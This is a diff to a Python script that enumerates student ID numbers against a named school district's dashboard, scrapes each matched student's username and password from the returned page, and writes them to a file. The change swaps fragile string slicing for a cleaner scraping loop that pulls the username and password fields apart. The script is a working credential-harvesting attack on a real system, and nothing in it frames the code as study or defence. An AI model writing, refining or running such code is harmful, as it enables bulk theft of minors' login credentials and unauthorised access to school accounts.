@@ -59,27 +59,26 @@ for x in range(4624021140, 4699999999):
         print("[RUN] " + green + "Found " + user.studentid + "..." + res)
 
         # Retrieve redirect url embedded in js code
-        firstFormat = BeautifulSoup(br.response().read(), 'lxml')
-        formatted = str(firstFormat)
+        soup = BeautifulSoup(br.response().read(), 'lxml')
+        formatted = str(soup)
+        print(soup)
         newUrl = downwithit(
             formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
         br.open("https://dashboard.okaloosaschools.com" + newUrl)
 
-        # Scrape and format web data
-        secondFormat = BeautifulSoup(br.response().read(), 'lxml')
-        body_tag = secondFormat.body
-        spanables = secondFormat.find_all('span')
-
-        # Clean up the scraped combo
-        userDirty = downwithit(spanables, "<span style=\" font-size: 15px; font-family: 'Courier New', 'Courier', monospace;\">",
-                               "</span>, <span style=\" font-size: 15px; font-family: 'Courier New', 'Courier', monospace;\">")
-        userClean = downwithit(userDirty, "</span>", "</span>")
-        userCombo = downwithit(userClean, "[", "]")
+        # # Scrape and format web data
+        soup = BeautifulSoup(br.response().read(), 'lxml')
+        tempCombo = []
+        for span in soup.select("td span"):
+            tempCombo.append(span.text)
+        print(tempCombo)
+        user.username = tempCombo[0]
+        user.password = tempCombo[1]
 
         # Write to file
         f = open("./assets/matches.txt", "a")
-        f.write("Combo: " + str(userCombo) + "\nStudentID: "
-                + user.studentid + "\n\n")
+        f.write("Student ID: " + user.studentid + "\nUsername: "
+                + user.username + "\nPassword: " + user.password + "\n\n")
         f.close()
 
         # Debug process time
